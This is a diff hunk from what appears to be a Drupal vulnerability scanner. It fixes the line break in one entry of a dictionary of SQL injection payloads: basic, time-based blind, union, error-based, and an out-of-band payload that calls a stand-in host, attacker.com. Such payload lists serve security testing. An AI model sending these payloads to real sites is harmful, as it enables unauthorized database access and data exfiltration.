@@ -164,9 +164,7 @@ drupal_vulns = {
     # SQL Injection
     "SQLi Basic": {"path": "/node?title=1' OR '1'='1", "method": "GET"},
     "SQLi Blind Time": {"path": "/node?title=1' AND SLEEP(5)--", "method": "GET"},
-    "SQLi Union": {"path": "/node?sort=1 UNION SELECT NULL,database(),NULL --
-
-", "method": "GET"},
+    "SQLi Union": {"path": "/node?sort=1 UNION SELECT NULL,database(),NULL --", "method": "GET"},
     "SQLi Error": {"path": "/node?title=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--", "method": "GET"},
     "SQLi Out-of-Band": {"path": "/node?title=1' AND LOAD_FILE('http://attacker.com')--", "method": "GET"},
     
